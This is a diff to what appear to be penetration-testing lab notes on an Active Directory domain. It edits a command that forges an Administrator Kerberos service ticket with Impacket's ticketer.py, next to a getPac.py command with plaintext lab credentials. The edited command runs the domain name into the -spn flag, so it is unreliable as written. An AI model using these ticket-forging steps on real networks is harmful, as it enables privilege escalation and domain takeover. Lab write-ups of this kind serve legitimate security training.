@@ -29,7 +29,7 @@ python3 getPac.py -targetUser administrator srcm.local/ksimpson:ksimpson
 
 - Forge the TGS:
 ```bash
-python3 ticketer.py -spn <svc_name> -user-id 500 Administrator -nthash <svc_hash> -domain-sid <domain_sid> -domain srcm.local
+python3 ticketer.py -nthash <pwd nthash> -user-id 500 Administrator -domain-sid <domain sid> -domain scrm.local-spn <spn name>
 ```
 - We now have an administrator ccache
 
